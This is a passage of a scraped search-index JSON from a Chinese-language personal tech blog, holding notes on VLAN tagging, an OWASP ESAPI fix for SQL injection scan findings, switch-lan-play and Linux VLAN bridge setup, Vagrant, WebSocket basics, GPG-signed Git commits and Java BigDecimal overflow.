一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"Access/Trunk, unTagged/Tagged 名稱 簡單說第一個是 Cisco 術語名稱。(Access / Trunk Mode)。 網路上看到 Trunk 出去會把 封包加上 Tag，進來封包會把 vLan tag 拔掉(unTag)。 因為這邊又講到 Trunk 所以我在貼一次。 名詞是可以轉換的，如下: Access \u003c=\u003e unTagged Trunk \u003c=\u003e Tagged ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:2:0","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"unTag / Tagged 對接問題 之前我要看到 Window 可以設定 vLan Tag，我好奇怎麼跟 Switch做串接，假如傳出去 tag 到非 tag會發生什麼事情呢?我在保哥 Blog 裡看到釐清網管型 Switch 裡與 VLAN + Tag + Untag 之間的觀念 | The Will Will Web如下: Switch 裡預設的情況下所有的 Ports 都是 Untagged VLAN Ports，而所有從 Switch 流入、流出的封包也都應該是 Untagged 的封包，也就是說封包本身並沒有附帶任何 FRAME 以外的資訊，所有無論網管型或一般型的 Switch 都可以認識這種格式的封包。 簡單說，Switch 1 支援 Tag/unTag 設備接到不懂 vLan Switch2 設備，Switch 2 無法識別Switch 1 傳過來封包，會被丟掉(Drop)。tag/unTag 收到 vLan 的 tag/unTag 封包都可以正常讀取風包(這句有點廢話)。不過對接就要非常注意!!首先還是把網路上看到 Trunk 出去會把 封包加上 Tag，進來封包會把 vLan tag 拔掉(unTag)。複製一次，在這個機制上 Tag 需要Tag接，說詳一點就是Switch 1 某一Port 設定 Trunk 必須跟 Switch 2 某 Port 設定 Trunk 接，unTag 就跟 unTag 接。 Tagged Port(Trunk) \u003c=\u003e Tagged Port(Trunk) unTagged Port \u003c=\u003e unTagged Port 上面提到 之前我要看到 Window 可以設定 vLan Tag，我好奇怎麼跟 Switch做串接，假如傳出去 tag 到非 tag會發生什麼事情呢? 我這個有問我朋友，他跟我說上面的概念，這個要跟 Tag對接。 釐清網管型 Switch 裡與 VLAN + Tag + Untag 之間的觀念 | The Will Will Web，這篇遇到問題是 untag 與 tagged對接問題，整篇篇幅非常長，不過細節還算講得滿清楚，在不太完全了解 Trunk 完全不太懂內容，不過了解後再讀就稍微明白。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:2:1","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"實際案例 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:3:0","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"模擬案例 - 兩個vLan 共同上網的方法 我原本有推論vLan 建立 PPPOE，透過兩邊 DHCP 設定gateway 設定 PPPOE 上網 位置，我朋友說可行的。這邊有簡單化個圖。 這邊簡單說一下重點 PC1、PC2 各放置 Vlan1、Vlan2 Switch Trunk 連接到 Router 是用子介面接的 A-TUR 是中華電信小烏龜 因為 Router 關係，廣播網愈無法到Switch那邊去，所以PC1、PC2無法做撥號 設定完 DHCP Server 也需要注意是否有用 NAT 動作(SNAT) DHCP server 是分派IP、DNS、Gateway，沒有 NAT 功能。平常我們DHCP設定玩，其他電腦就能上網，其實設備上都幫你做好，不須而外設定，這邊要注意!! 最後我原本想把這兩個vLan接到(Trunk)路由器，但這樣兩邊vlan就能相連了，因為路由器關係。 我朋友建議通常都是用有支援 ACL路由器去做分開網段，Policy 去做網域控管動作。 我另一個方案，用 Swtch 建立 虛擬網卡做 PPPOE 連線，但是我同學提點我，Switch 沒辦法像路由器做到建立虛擬網卡，因為他是Layer 2設備，無法像 Router 建立虛擬網卡，所以這一招基本上是不行的。 當然還有一些概念沒有提到，像是Native vlan ，我朋友說目前我沒有什麼機會用到，所以這邊我就先不學了。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:3:1","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"實際案例 我朋友之前有介紹他家使用 vLan 讓他房間可以用中華電信 Mod方法，大概用vLan。那時候聽看到五彩繽紛顏色沒有很懂，現在回頭看，大概清楚了！透過vLan 弱電箱在客廳，vLan遷過房間去，就可以在房間用中華電信 Mod 看電視。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:3:2","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"彩蛋 MTR ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:4:0","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["源碼掃描"],"content":"參考： GitHub - ESAPI/esapi-java JAVA 安全编程——ESAPI与OWASP Top 10 - 简书 SQL Injection Prevention - OWASP Cheat Sheet Series ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/:0:0","tags":["owasp","sql","injection"],"title":"使用 OWASP Enterprise Security API (ESAPI) 解決 SQL Injection 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"四種解決方法 裡面有提到，正常有用安全性處理參數方法就能解決這個問題。沒有的話使用Defense Option 4: Escaping All User-Supplied Input解決問題，程式邏輯上通常不會大改。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/:1:0","tags":["owasp","sql","injection"],"title":"使用 OWASP Enterprise Security API (ESAPI) 解決 SQL Injection 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"Jar 位置 Maven Repository: org.owasp.esapi » esapi » 2.2.3.1 放置 ESAPI.properties ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/:2:0","tags":["owasp","sql","injection"],"title":"使用 OWASP Enterprise Security API (ESAPI) 解決 SQL Injection 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"需要放置 ESAPI.properties Yeah, you can get rid of those messages by running it as: java -Dorg.owasp.esapi.logSpecial.discard=true … So, this is not a bug, but a feature. See https://javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/reference/DefaultSecurityConfiguration.html for details of how ESAPI searches for the ESAPI.properties file. 沒有預設設定… https://github.com/ESAPI/esapi-java-legacy/issues/653#issuecomment-1016995464 當然原官方上面也有放，但預設抓不到這個地方。 https://github.com/ESAPI/esapi-java-legacy/blob/develop/configuration/esapi/ESAPI.properties 可放置專案的src\\esapi當然這邊看專案設定路徑 或者可放入參數，詳細可看官網或log設定 src\\esapi\\ESAPI.properties、src\\esapi\\validation.properties ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/:3:0","tags":["owasp","sql","injection"],"title":"使用 OWASP Enterprise Security API (ESAPI) 解決 SQL Injection 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"小記 最後做源碼掃描就沒有被掃描出來，可喜可賀。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/:4:0","tags":["owasp","sql","injection"],"title":"使用 OWASP Enterprise Security API (ESAPI) 解決 SQL Injection 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-OWASP-Enterprise-Security-API-ESAPI-%E8%A7%A3%E6%B1%BA-SQL-Injection-%E5%95%8F%E9%A1%8C/"},{"categories":["網路"],"content":"官網詳細教學:LAN Play Status | lan-play.com # 下載程式 wget https://github.com/spacemeowx2/switch-lan-play/releases/download/v0.2.3/lan-play-linux # 執行權限 chmod +x lan-play-linux # root 執行程式 sudo ./lan-play-linux --relay-server-addr switchlanplay-tw.ddns.net:11451 --netif __你的網路卡__ 不知道是不是我朋友有防火牆(Fortigate)關係，他少一個 log。所以我們沒連線成功… 我的 Client 我朋友的 Client ","date":"2022-02-13","objectID":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/:0:0","tags":["switch","lan","switch"],"title":"Switch Lan play 模擬區往連線遊玩","uri":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/"},{"categories":["網路"],"content":"原理 詳細內容: Switch lan-play原理 – 夜明的孤行燈備份圖 我沒有想到可以用程式方式去做轉送封包，這個解法很有趣。感覺能運用在某些地方。不過這種方法必須2台當 Router。所以沒有說到實用。 從官網看到PS4也能做到。 ","date":"2022-02-13","objectID":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/:1:0","tags":["switch","lan","switch"],"title":"Switch Lan play 模擬區往連線遊玩","uri":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/"},{"categories":["網路"],"content":"嘗試區網研究資料(彩蛋) 本來想試試這個能不能簡單用區網連線，查看原理需要四台電腦，不過遊玩電腦會沒辦法連線上網，所以這種可能也不是很好遊玩體驗。因為我想試試連線功能，但是我家沒有 vlan 設備機器，想看看 VM 是不是可以做 vlan 動作，從 PVE 看到 KVM(libvirt)，因為不太想重灌，PVE設定 openSwitch 好像又是一道門檻，想直接模擬出來最好，有看到 iproute2 用 vlan ，在安裝ubuntu 時候有看到 mutlipass 這套工具，可以像 vagrant 快速建立好 KVM，不過 mutlipass networks 無法使用，好像目前沒有對此作設定，所以我透過GUI設定選到 bridge(vlan) ，不過用完電腦整台連線會有問題…，所以目前失敗。也許用實體swtich 測試實體機器會比較快，但是就是沒機器…，不過這次也讓我玩到 KVM 這一塊，單單啟動一台虛擬機器 multipass 不會輸給 vagrant， 快速建置 ubuntu 真的很方便。有時間我再來研究這個。 以下我爬到的文章，這邊就不整理了，隨便紀錄。 socat 广播以及多播 - 荣锋亮 - 博客园 Ubuntu 上 Vagrant+Libvirt 虛擬環境 - 我是山姆鍋 GitHub - aesirteam/openvswitch-demo 手把手教你 Linux 是如何實現 VLAN 的 - 台部落 Linux下vlan的学习（下） | 污力大熊的博客 How to configure VLAN network in Ubuntu - {With examples} networking - How do I configure a vlan-linked bridge in netplan to serve a VM? - Ask Ubuntu Create Bonding, Vlan, Bridge Interface in Ubuntu 18 Using Netplan and networkd | by Restu Nursobah | Medium Multipass — 如 Docker 般的虛擬機. 好讀版： | by Jack Kuo | Medium multipass launch 16.04 -c 4 -m 4G -d 20G -n ubuntu service networking force-reload multipass launch 16.04 -c 1 -m 512M -d 2G -n kvm1 multipass launch 16.04 -c 1 -m 256M -d 20G -n ubuntu --network name=brvlan1,mode=manual ## auto wlp3s0.1 iface wlp3s0.1 inet manual vlan-raw-device wlp3s0 auto brvlan1 iface brvlan1 inet manual bridge_stp off bridge_waitport 0 bridge_fd 0 bridge_ports wlp3s0.1 auto wlp3s0.2 iface wlp3s0.2 inet manual vlan-raw-device wlp3s0 auto brvlan2 iface brvlan2 inet manual bridge_stp off bridge_waitport 0 bridge_fd 0 bridge_ports wlp3s0.2 ## sudo ip link add link wlp3s0 name wlp3s0.100 type vlan id 100 sudo ip link set dev wlp3s0.100 up sudo ip link add link wlp3s0 name wlp3s0.200 type vlan id 200 sudo ip link set dev wlp3s0.100 master brvlan1 sudo ip link set dev wlp3s0.200 master brvlan2 sudo ip link set dev wlp3s0.200 up sudo ip link add name brvlan1 type bridge sudo ip link set dev brvlan1 up sudo ip link add name brvlan2 type bridge sudo ip link set dev brvlan2 up Additional network interfaces | Multipass documentation 虚拟化技术之kvm管理工具virsh常用基础命令（一） - Linux-1874 - 博客园 How to configure a VLAN in Linux | Enable Sysadmin Linux Bridge 詳解_我在對面的角落 - MdEditor Linux 虚拟网络设备 veth-pair 详解，看这一篇就够了 - 猿大白 - 博客园 Linux網路裝置veth pair和netns_我在對面的角落 - MdEditor 云计算底层技术-虚拟网络设备(Bridge,VLAN) | opengers Create VLAN bridge under Linux (trunk, IEEE 802.1Q) | panticz.de ","date":"2022-02-13","objectID":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/:2:0","tags":["switch","lan","switch"],"title":"Switch Lan play 模擬區往連線遊玩","uri":"/blog/posts/Switch-Lan-play-%E6%A8%A1%E6%93%AC%E5%8D%80%E5%BE%80%E9%80%A3%E7%B7%9A%E9%81%8A%E7%8E%A9/"},{"categories":["Vagrant"],"content":"之前有看到有一篇說到使用 Vagrant 時，要把其他啟用 Vagrant 關閉，因為有可能跟其他機器衝突。最近想關閉其他機器，所以找了一次關機所有機器方法。順便留著紀錄。 # 看所有機器狀態 vagrant global-status] # 開啟機器做關機 vagrant global-status | awk '/running/{print $1}' | xargs -r -d '\\n' -n 1 -- vagrant suspend 參考: Shutting down all VirtualBox (vagrant) VMs in one easy to use bash command (that can be put into a bash file) - Ask Ubuntu ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-%E9%97%9C%E6%A9%9F%E6%B2%92%E7%94%A8%E5%88%B0%E7%9A%84%E6%A9%9F%E5%99%A8/:0:0","tags":["vagrant","shell"],"title":"Vagrant 關機沒用到的機器","uri":"/blog/posts/Vagrant-%E9%97%9C%E6%A9%9F%E6%B2%92%E7%94%A8%E5%88%B0%E7%9A%84%E6%A9%9F%E5%99%A8/"},{"categories":["JavaScript"],"content":"我的錯誤印象(應該沒有人要看，可跳過) 在看 websocket 之前，我以為 websocket 是在 HTTP 協定，因為跟 EventSource(server sent events)很像，只是是做單方面傳輸，又簡單看相關文章，EventSource會有Proxy問題，但是websocket 不會有問題，websocket 有 SLB問題。在文章都有提到 HTTP header 相關，開發工具也可以看到相關資訊，以為傳輸資料就是一般request/response，但最近時實作發現我錯了。 ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:1:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"非http協定 在傳輸前會跟 http 做溝通，才會傳輸 websocket ，但是並不是傳統的request/response。開發工具只換看到一筆(ws)，但是裡面內容 其他特點包括： （1）建立在 TCP 協議之上，服務器端的實現比較容易。 （2）與 HTTP 協議有著良好的兼容性。默認端口也是80和443，並且握手階段採用 HTTP 協議，因此握手時不容易屏蔽，能通過各種 HTTP 代理服務器。 （3）數據格式比較輕量，性能開銷小，通信高效。 （4）可以發送文本，也可以發送二進制數據。 （5）沒有同源限制，客戶端可以與任意服務器通信。 （6）協議標識符是ws（如果加密，則為wss），服務器網址就是 URL。 詳細: WebSocket 教程 - 阮一峰的网络日志 ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:2:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"封包一些事情 Websocket 是一個基於 TCP 的傳輸協議，主要都應用在瀏覽器與 server 雙向溝通，具有靈活及高效能。 ws 表示基於TCP的 Websocket，預設使用 80埠。 wss 則表示執行在 TLS 之上的 Websocket，預設使用 443埠。 HTTP協議溝通過程都需要攜帶 Head，在傳統網站通訊都是透過輪巡來向 server 發出請求，容易造成 server端的負擔。 Websocket 在首次建立連結是透過 HTTP GET 發出請求，與 server 取得溝通後，接續就會使用websocket協議來進行溝通。 未攜帶數據情況下，client 僅需要少量的掩碼(4字節)，server 端則只需要 2-10 Byte。相較於 polling 與 log-polling ，websocket 可以在更短的時間傳送更多資料。 Websocket 通訊傳輸層次 在 OSI 模型中，Http 與 Websocket (FTP, SMTP, POP3..)都屬於第七層 應用層，基礎是建立於 TCP 協議之上。 此外，Websocket 在前面提過，首次握手是透過HTTP來達成。 後續才是用 Websocket 雙向溝通。 Socket 與 Websocket 之間的關係 Socket 是在應用層和傳輸層之間的一個抽象層，原則上，Socket並非協議方式存在，主要是用於搭起 TCP/IP 與UDP/IP 或 ICMP 的連接服務，當兩個服務進行通訊時，首先就須要透過 socket 連線，例如， TCP 或 UDP 就是透過 socket 先建立起連線，在這連線過程會依照協議來做溝通。 所以，Socket 屬於傳輸控制層的抽象層，Websocket 則屬於應用層的協議。 心跳機制保持 Websocket 連線 在 Websocket 建立後，服務其實相當脆弱，只要遇到連線問題，客戶端就會發送關閉連線的 Fin，很容易就會造成斷開，造成服務中斷。有時，也可能是服務端有發生異常，但客戶端仍持續連線，或者是客戶端異常，但server端仍以為客戶端存在，造成zonbit connection。因此，會透過心跳機制來維持雙向通訊，能持續提供服務。 基本機制是由兩方透過 ping, pong 的接收與回應，持續確認連線正常。比較推薦的通常是在客戶端定期發送心跳，讓 server 進行監聽，當客戶端經過一段時間沒有發送訊息，server端就會自動斷開。關於心跳機制部分，可參考 - 即時通訊架構-心跳檢測原理說明。 以上參考深入理解 Websocket 協議，常見攻擊手法及防護策略，更多資訊可以看到裡面。 ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:3:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"沒有實作廣播(broadcast) 在沒深入websocket文章時候，看相關文章都有做廣播功能，因為那時候有自學 RabbitMQ，看這種功能類似 MQ 概念，但最近用JAVA時做 websocket 簡單範例，發現顛覆我的印象。所以websocket WebSocket Test Client - Chrome 線上應用程式商店 ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:4:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"SLB 解決 發現 websocket 不是純 http，但他是應用層，所以我猜測她還是有機會用 sticky session 機制繞過去。有看到說明ws 相容 http ，所以應該可以做到?簡單docker-compose scale 看看。 nodejs執行環境 · Docker學習筆記 JavaScript | WebSocket 讓前後端沒有距離. WebSocket 是網路協定的一種， Client 可以透過此協定與… | by 神Q超人 | Enjoy life enjoy coding | Medium ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:5:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"登入驗證(Oauth) ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:6:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"測試工具 curl - How to read websocket response in linux shell - Stack Overflow Test a WebSocket using curl. · GitHub Sending Message To Specific Anonymous User On Spring WebSocket - Michael Hoffmann (Mokkapps) - Senior Frontend Developer (Freelancer) ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:7:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"其他文章 WebSocket 的故事（二）—— Spring 中如何利用 STOMP 快速构建 WebSocket 广播式消息模式 - 掘金，有講到STOMP ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:8:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"程式實作 PlayingWithWebsocket/EchoServer.java at master · sharif2008/PlayingWithWebsocket · GitHub 有實作廣播(broadcast)功能，簡單程式可以參考看看。 webSocket+jwt实现方式 - 我是属车的 - 博客园 springboot整合WebSocket | 分享知识 ","date":"2022-02-13","objectID":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/:9:0","tags":["javascript","websocket"],"title":"Websocket 一些基本知識整理","uri":"/blog/posts/Websocket-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AD%98%E6%95%B4%E7%90%86/"},{"categories":["Git"],"content":"之前使用 GitKrakn GIT 簽章(PGP) | 程式狂想筆記有紀錄怎麼在GUI(Window)模式快速使用 GPG 簽章，但我最近對 GitKrakn pull幫我做 stash 感到厭煩，所以有找解決方法。GitKraken : how to stop stash before pull ? : git裡面有提到換工具或下指令，所以我只能跟 GitKrakn 說掰掰。 之前家GPG簽章，原本 Git Bash commit 都會失敗，最近換成 Git-Fork 會失敗，還是得面對人生趕快找問題。簡單說Git bash 不走 window 環境上的GPG，所以會沒吃到，所以要把 Window 上的GPG(公鑰、私鑰)匯出到 Git Bash 上就可以正常 commit。 ","date":"2022-02-13","objectID":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:0:0","tags":["git","gpg"],"title":"GPG window 路徑與 Git 設定簽章方法","uri":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"排除方法 gpg –list-secret-keys 路徑預設C:/Users/User/AppData/Roaming/gnupg/pubring.kbx 匯出簽章私鑰和公鑰 ","date":"2022-02-13","objectID":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:1:0","tags":["git","gpg"],"title":"GPG window 路徑與 Git 設定簽章方法","uri":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"相關指令 參考: [GnuPG] gpg 金鑰管理 · Hello, World! 如何使用 GPG (GnuPG) 對 Git Commit 與 Tag 進行簽章 | The Will Will Web 用 git bash 匯入 private key gpg --import xxxx.asc 其他要注意的 Git相關設定，我的不知道為什麼有自動調好，Git Bash 金鑰匯入後，就能直接使用 git config --global commit.gpgsign git config --global gpg.program git config --global user.signingkey Git Bash、Git Fork 都能正常簽章 commit了。 ","date":"2022-02-13","objectID":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:2:0","tags":["git","gpg"],"title":"GPG window 路徑與 Git 設定簽章方法","uri":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"GIT 設定簽章 因為 git diff 設定壞掉，我腦根筋不對，把gitconfig 刪掉，結果一些設定都要重新用。 git config --global commit.gpgsign true git config --global user.signingkey ","date":"2022-02-13","objectID":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:3:0","tags":["git","gpg"],"title":"GPG window 路徑與 Git 設定簽章方法","uri":"/blog/posts/GPG-window-%E8%B7%AF%E5%BE%91%E8%88%87-Git-%E8%A8%AD%E5%AE%9A%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"最近發現我的專案很多都用bigdecimal.intvalue()去做結果。結果有一筆99億額計算出了大問題。建議不要亂轉 intValue。 Java.math.BigDecimal.intValue()方法實例 - Java.math包 import java.math.*; public class BigDecimalDemo { public static void main(String[] args) { // create 3 BigDecimal objects BigDecimal bg1, bg2; //Create 2 int Object int i1, i2; bg1 = new BigDecimal(\"1234\"); //assign a larger value to bg2 bg2 = new BigDecimal(\"3383878445\"); // assign the int value of bg1 and bg2 to i1,i2 respectively i1 = bg1.intValue(); i2 = bg2.intValue(); String str1 = \"int value of \" + bg1 + \" is \" + i1; String str2 = \"int value of \" + bg2 + \" is \" + i2; // print i1,i2 System.out.println( str1 ); System.out.println( str2 ); } } ","date":"2021-11-07","objectID":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/:0:0","tags":["java","bigdecimal"],"title":"BigDecimal.intValue 超過 int 長度會變成負號","uri":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/"},{"categories":["Java"],"content":"解決方案 ","date":"2021-11-07","objectID":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/:1:0","tags":["java","bigdecimal"],"title":"BigDecimal.intValue 超過 int 